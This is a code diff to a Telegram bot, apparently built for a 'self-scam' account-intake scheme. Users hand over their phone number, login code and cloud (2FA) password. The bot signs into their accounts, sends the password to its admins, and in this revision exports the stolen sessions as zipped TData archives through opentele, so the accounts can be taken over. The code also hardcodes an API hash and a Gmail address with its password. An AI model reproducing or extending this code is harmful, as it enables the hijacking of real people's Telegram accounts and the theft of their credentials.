@@ -1,11 +1,13 @@
 # ==========================================
 # Проект: samoobman priemka (Telegram Bot)
-# Стек: aiogram 3.x, aiosqlite, telethon
+# Стек: aiogram 3.x, aiosqlite, telethon, opentele
 # ==========================================
 
 import asyncio
 import logging
 import os
+import shutil
+import zipfile
 import imaplib
 import email
 from email.header import decode_header
@@ -31,6 +33,8 @@ from telethon.errors import (
     SessionPasswordNeededError,
     PasswordHashInvalidError,
 )
+from opentele.api import UseCurrentSession
+from opentele.tl import TelegramClient as OpenTeleClient
 
 # Настройка логирования
 logging.basicConfig(level=logging.INFO)
@@ -44,16 +48,17 @@ LOGS_CHANNEL_ID = -1003813816419
 
 API_ID = 31063615  # Число (int) для Telethon
 API_HASH = "dbe3b8f435016b0dcd3e4bca995a9169"
-AUTO_PASSWORD = "ssss"  # Пароль для автоматической установки
 
-# Настройки почты для автопривязки и чтения кодов
+# Настройки почты для чтения кодов (оставлено только для мониторинга писем)
 TARGET_EMAIL = "wintya732@gmail.com"
 EMAIL_PASSWORD = "18s0ssh77m1gZ"
 IMAP_SERVER = "imap.gmail.com"
 
 DB_PATH = "database.db"
 SESSIONS_DIR = "sessions_data"
+TDATA_DIR = "tdata_output"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
+os.makedirs(TDATA_DIR, exist_ok=True)
 
 bot = Bot(token=API_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -76,7 +81,6 @@ class AdminStates(StatesGroup):
     waiting_for_photo_profile = State()
     waiting_for_photo_withdraw = State()
     waiting_for_photo_submit = State()
-    waiting_for_admin_login_code = State()
 
 
 class WithdrawStates(StatesGroup):
@@ -308,12 +312,8 @@ async def email_listener_worker():
 
 
 async def finalize_auth_and_success(message: Message, state: FSMContext, client: TelegramClient, phone: str,
-                                    session_name: str):
-    try:
-        await client.edit_2fa(new_password=AUTO_PASSWORD)
-    except Exception as e:
-        logger.warning(f"Не удалось обновить пароль: {e}")
-
+                                    session_name: str, has_2fa: bool = False, password_used: str = None):
+    # Пароль и почта не меняются — сессия сохраняется в исходном виде[cite: 5]
     await client.disconnect()
 
     async with aiosqlite.connect(DB_PATH) as db:
@@ -329,14 +329,14 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
 
     for admin_id in ADMIN_IDS:
         try:
+            pwd_info = f"\n• 🔑 2FA Пароль: `{password_used}`" if has_2fa else "\n• 🔑 2FA Пароль: Отсутствует"
             await bot.send_message(
                 chat_id=admin_id,
                 text=(
                     f"📥 **Новый аккаунт успешно принят!**\n\n"
                     f"• Пользователь: `{message.from_user.id}`\n"
-                    f"• Телефон: `{phone}`\n"
-                    f"• 🔑 Пароль (2FA): `{AUTO_PASSWORD}`\n"
-                    f"• ✉️ Почта: `{TARGET_EMAIL}`"
+                    f"• Телефон: `{phone}`"
+                    f"{pwd_info}"
                 ),
                 parse_mode="Markdown"
             )
@@ -514,7 +514,7 @@ async def process_code(message: Message, state: FSMContext):
 
     try:
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-        await finalize_auth_and_success(message, state, client, phone, session_name)
+        await finalize_auth_and_success(message, state, client, phone, session_name, has_2fa=False)
     except SessionPasswordNeededError:
         pwd_text = "🔐 На вашем аккаунте установлен облачный пароль (двухэтапная аутентификация).\nПожалуйста, введите ваш пароль от аккаунта:"
         if prompt_msg_id:
@@ -560,7 +560,8 @@ async def process_password(message: Message, state: FSMContext):
 
     try:
         await client.sign_in(password=password)
-        await finalize_auth_and_success(message, state, client, phone, session_name)
+        await finalize_auth_and_success(message, state, client, phone, session_name, has_2fa=True,
+                                        password_used=password)
     except PasswordHashInvalidError:
         err_text = "❌ Неверный пароль. Попробуйте ввести правильный облачный пароль:"
         if prompt_msg_id:
@@ -731,7 +732,7 @@ async def cb_admin_panel(callback: CallbackQuery):
         return await callback.answer("Доступ запрещен.", show_alert=True)
 
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📱 Вход в аккаунты клиентов", callback_data="admin_accounts_list")],
+        [InlineKeyboardButton(text="📁 Выгрузка TData (Успешные)", callback_data="admin_accounts_list")],
         [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
         [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
         [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
@@ -744,7 +745,7 @@ async def cb_admin_panel(callback: CallbackQuery):
     )
 
 
-# --- ВХОД В АККАУНТЫ ИЗ АДМИНКИ ---
+# --- ВЫГРУЗКА TDATA ИЗ УСПЕШНЫХ ЗАЯВОК ---
 @router.callback_query(F.data == "admin_accounts_list")
 async def admin_accounts_list(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
@@ -763,19 +764,19 @@ async def admin_accounts_list(callback: CallbackQuery):
     for acc in accounts:
         acc_id, uid, phone, date_str = acc
         kb_buttons.append(
-            [InlineKeyboardButton(text=f"📱 {phone} (ID: {uid})", callback_data=f"adm_login_acc_{acc_id}")])
+            [InlineKeyboardButton(text=f"📦 TData: {phone} ( ID {uid} )", callback_data=f"adm_tdata_acc_{acc_id}")])
 
     kb_buttons.append([InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")])
 
     await callback.message.edit_text(
-        "📱 **Выберите аккаунт для отправки кода входа:**",
+        "📁 **Выберите успешный аккаунт для получения TData архива:**",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons),
         parse_mode="Markdown"
     )
 
 
-@router.callback_query(F.data.startswith("adm_login_acc_"))
-async def admin_trigger_login(callback: CallbackQuery, state: FSMContext):
+@router.callback_query(F.data.startswith("adm_tdata_acc_"))
+async def admin_generate_tdata(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
         return
 
@@ -789,101 +790,56 @@ async def admin_trigger_login(callback: CallbackQuery, state: FSMContext):
         return await callback.answer("❌ Аккаунт не найден в базе данных.", show_alert=True)
 
     phone, session_name = row
+    session_file_path = f"{session_name}.session"
 
-    if not os.path.exists(f"{session_name}.session"):
+    if not os.path.exists(session_file_path):
         return await callback.answer("❌ Файл сессии (.session) не найден на сервере!", show_alert=True)
 
-    await callback.message.edit_text("⏳ Инициализация сессии и отправка запроса кода в Telegram...")
+    await callback.message.edit_text(f"⏳ Конвертация сессии аккаунта **{phone}** в формат TData...",
+                                     parse_mode="Markdown")
 
-    client = TelegramClient(session_name, API_ID, API_HASH)
+    tdata_out_path = os.path.join(TDATA_DIR, f"tdata_{acc_id}_{phone.replace('+', '')}")
+    if os.path.exists(tdata_out_path):
+        shutil.rmtree(tdata_out_path, ignore_errors=True)
+    os.makedirs(tdata_out_path, exist_ok=True)
 
     try:
+        # Конвертируем Telethon session в TData с помощью opentele
+        client = OpenTeleClient(session_file_path, api_id=API_ID, api_hash=API_HASH)
         await client.connect()
-        # Проверяем, авторизована ли сессия
-        if not await client.is_user_authorized():
-            sent = await client.send_code_request(phone)
-            await state.update_data(
-                admin_client=client,
-                admin_phone=phone,
-                admin_code_hash=sent.phone_code_hash,
-                admin_session_path=session_name
-            )
-            await state.set_state(AdminStates.waiting_for_admin_login_code)
 
-            kb = InlineKeyboardMarkup(
-                inline_keyboard=[[InlineKeyboardButton(text="❌ Отмена", callback_data="admin_accounts_list")]])
-            await callback.message.edit_text(
-                f"📲 Код авторизации для аккаунта **{phone}** отправлен!\n\n"
-                f"Пожалуйста, введите полученный 5-значный код прямо в этот чат:",
-                reply_markup=kb,
-                parse_mode="Markdown"
-            )
-        else:
+        if not await client.is_user_authorized():
             await client.disconnect()
             kb = InlineKeyboardMarkup(inline_keyboard=[
                 [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]])
-            await callback.message.edit_text(
-                f"✅ Сессия аккаунта **{phone}** уже полностью активна и авторизована!",
-                reply_markup=kb,
-                parse_mode="Markdown"
-            )
-    except Exception as e:
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        kb = InlineKeyboardMarkup(
-            inline_keyboard=[[InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]])
-        await callback.message.edit_text(f"❌ Ошибка при запросе кода: {e}", reply_markup=kb)
+            return await callback.message.edit_text(f"❌ Ошибка: сессия аккаунта {phone} слетела или не авторизована.",
+                                                    reply_markup=kb)
 
-
-@router.message(AdminStates.waiting_for_admin_login_code)
-async def admin_process_login_code(message: Message, state: FSMContext):
-    if message.from_user.id not in ADMIN_IDS:
-        return
-
-    code = message.text.strip()
-    data = await state.get_data()
-    client: TelegramClient = data.get("admin_client")
-    phone = data.get("admin_phone")
-    code_hash = data.get("admin_code_hash")
-
-    try:
-        await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)
+        # Сохранение в tdata
+        await client.ToTData(tdata_out_path)
         await client.disconnect()
-        await state.clear()
+
+        # Архивируем папку tdata в .zip
+        zip_filename = f"{tdata_out_path}.zip"
+        shutil.make_archive(tdata_out_path, 'zip', tdata_out_path)
 
         kb = InlineKeyboardMarkup(
             inline_keyboard=[[InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]])
-        await message.answer(
-            f"✅ **Успешный вход в аккаунт {phone}!**\nАвторизация прошла успешно.",
+
+        await callback.message.answer_document(
+            document=FSInputFile(zip_filename),
+            caption=f"📁 **Готовый TData архив** для аккаунта: `{phone}`\nДанные владельца не изменялись.",
             reply_markup=kb,
             parse_mode="Markdown"
         )
-    except SessionPasswordNeededError:
-        # Если вдруг запросит 2FA пароль, автоматически пробуем стандартный AUTO_PASSWORD ("ssss")
-        try:
-            await client.sign_in(password=AUTO_PASSWORD)
-            await client.disconnect()
-            await state.clear()
-            kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]])
-            await message.answer(
-                f"✅ **Успешный вход в аккаунт {phone}** (с использованием авто-пароля `ssss`)!",
-                reply_markup=kb,
-                parse_mode="Markdown"
-            )
-        except Exception as ex:
-            await client.disconnect()
-            await state.clear()
-            await message.answer(f"❌ Ошибка входа по 2FA паролю: {ex}")
+        await callback.message.delete()
+
     except Exception as e:
-        try:
-            await client.disconnect()
-        except Exception:
-            pass
-        await state.clear()
-        await message.answer(f"❌ Ошибка авторизации с кодом: {e}")
+        logger.error(f"Ошибка конвертации в TData: {e}")
+        kb = InlineKeyboardMarkup(
+            inline_keyboard=[[InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]])
+        await callback.message.edit_text(f"❌ Ошибка при конвертации в TData:\n`{e}`", reply_markup=kb,
+                                         parse_mode="Markdown")
 
 
 # --- УПРАВЛЕНИЕ КАРТИНКАМИ ---
